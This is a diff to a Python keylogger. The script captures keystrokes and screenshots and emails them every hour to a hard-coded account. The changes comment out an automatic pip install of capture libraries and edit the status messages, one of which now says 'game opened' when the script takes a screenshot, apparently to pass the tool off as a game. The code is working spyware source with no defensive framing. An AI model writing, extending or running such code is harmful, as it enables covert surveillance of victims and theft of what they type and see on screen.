@@ -13,21 +13,21 @@ from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
 # except ModuleNotFoundError:
-from subprocess import call
-modules = ["pyscreenshot", "sounddevice", "pynput"]
-call("pip install " + ' '.join(modules), shell=True)
+# from subprocess import call
+# modules = ["pyscreenshot", "sounddevice", "pynput"]
+# call("pip install " + ' '.join(modules), shell=True)
 
 
 # finally:
 EMAIL_ADDRESS = "email"
 EMAIL_PASSWORD = "pass"
-SEND_REPORT_EVERY = 3600
+SEND_REPORT_EVERY = 3600 # time in seconds
 
 
 class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
-            self.log = "Opened game"
+            self.log = "Keylogger started successfully"
             self.email = email
             self.password = password
 
@@ -121,7 +121,7 @@ class KeyLogger:
             self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
             
         def screenshot(self):
-            print('screenshotting...')
+            print('game opened')
             img = pyscreenshot.grab()
             img.save('ss.png')
             self.send_img()
